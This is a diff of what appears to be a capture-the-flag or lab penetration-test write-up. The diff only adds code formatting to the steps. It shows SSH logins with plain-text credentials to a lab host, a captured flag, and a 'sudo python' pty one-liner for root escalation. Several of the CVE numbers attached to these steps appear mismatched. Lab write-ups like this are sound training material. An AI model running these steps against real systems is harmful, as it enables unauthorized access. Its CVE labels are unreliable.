@@ -38,9 +38,9 @@ Exploit Used:
 
 Exposed Username And Weak Password (CVE-2017-7760)(High)
 
-ssh michael@192.168.1.110
+`ssh michael@192.168.1.110`
 
-password: michael
+`password: michael`
 
 ### flag3.txt: _afc01ab56b50591e7dccf93122770cd2_
 
@@ -48,9 +48,9 @@ Exploit Used:
 
 SSH Remote Login (CVE-2021-28041)(High)
 
-ssh steven@localhost
+`ssh steven@localhost`
 
-password: pink84
+`password: pink84`
 
 HTML Password Hash Disclosure (CVE-2019-15653)(High)
 
@@ -60,4 +60,4 @@ Exploit Used:
 
 Python Privilege Escalation (CVE-2018-1000030)(Low)
 
-sudo python -c 'import pty;pty.spawn("/bin/bash");'
+`sudo python -c 'import pty;pty.spawn("/bin/bash");'`
